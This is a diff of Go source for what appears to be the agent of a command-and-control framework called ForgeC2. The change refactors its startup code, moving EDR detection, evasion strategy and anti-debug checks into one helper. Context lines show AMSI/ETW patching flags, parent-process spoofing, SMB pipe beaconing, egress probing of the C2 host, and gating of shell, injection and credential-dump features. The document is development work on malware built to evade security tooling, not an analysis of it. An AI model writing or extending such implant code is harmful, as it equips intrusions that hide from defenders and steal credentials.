@@ -33,14 +33,12 @@ func init() {
 		runSandboxCheck()
 	}()
 
-	// Environment classification (async to avoid delaying startup)
+	// Environment classification (async to avoid delaying startup); only the
+	// ops profile is kept â€” it gates the shell/injection/cred-dump checks below.
 	go func() {
 		time.Sleep(3 * time.Second)
-		envClass, opsProfile := detectEnvironment()
-		if opsProfile != nil {
-			currentEnvClass = envClass
+		if _, opsProfile := detectEnvironment(); opsProfile != nil {
 			currentOpsProfile = opsProfile
-			envDetected = true
 			if !opsProfile.AllowShell {
 				logDebug("[env] Shell commands disabled in this environment")
 			}
@@ -137,30 +135,10 @@ func init() {
 		ghostModeEnabled = true
 	}
 
-	// Adaptive EDR detection: detect running EDR and apply optimal evasion strategy
-	edrInfo := DetectEDR()
-	strategy := edrInfo.GetStrategy()
-	ApplyStrategy(strategy)
-	if edrInfo.Detected && Debug {
-		fmt.Printf("[EDR] Detected %s, applied strategy\n", edrInfo.Name)
-	}
-
-	// Anti-debug detection: early check before beaconing starts
-	if runtime.GOOS == "windows" {
-		score, details := AntiDebugCheck()
-		antiDebugScore = score
-		if score > 20 {
-			antiDebugTriggered = true
-			logDebugf("[antidebug] Detection score: %d/%d checks triggered", score, len(details))
-			if score > 50 {
-				enterGhostMode("anti-debug threshold exceeded")
-			} else {
-				patchAMSI = false
-				patchETW = false
-			}
-		}
-		go runAntiDebugMonitor()
-	}
+	// Adaptive EDR detection + early anti-debug sweep. All of this plumbing
+	// (evasion strategy flags, anti-debug hooks) is windows-only; the linux
+	// stub is a harmless no-op.
+	applyAdaptiveEvasion()
 
 	ppidSpoofEnabled = strings.ToLower(PPIDSpoofStr) == "true" || PPIDSpoofStr == "1"
 	if v := os.Getenv("FORGEC2_PPID_SPOOF"); v == "1" || strings.ToLower(v) == "true" {
@@ -178,7 +156,6 @@ func init() {
 
 	egressDetection = strings.ToLower(EgressDetectionStr) == "true" || EgressDetectionStr == "1"
 
-	chameleonEnabled = strings.ToLower(ChameleonStr) == "true" || ChameleonStr == "1"
 	chameleonProfile = ChameleonProfileStr
 	if chameleonProfile == "" {
 		chameleonProfile = "random"
@@ -405,9 +382,8 @@ func main() {
 	agentRegKey = loadAgentRegKey()
 	loadBeaconState()
 
-	// Mark as SMB child if using SMB transport
+	// Debug note when running attached to an SMB parent pipe.
 	if getProtocol() == "smb" || getBeaconTransport() == "smb" {
-		isSMBChild = true
 		if Debug {
 			fmt.Printf(s(SForgeC2)+" SMB child mode, pipe: %s\n", smbPipeName)
 		}
@@ -457,8 +433,6 @@ func main() {
 			fmt.Printf("[egress] Running egress detection against %s ports %v\n", c2Host, ports)
 		}
 		report := runEgressDetection(c2Host, ports)
-		egressReport = report
-		egressDetected = true
 		if report.Best != "" {
 			bestEgressProto = report.Best
 			if Debug {
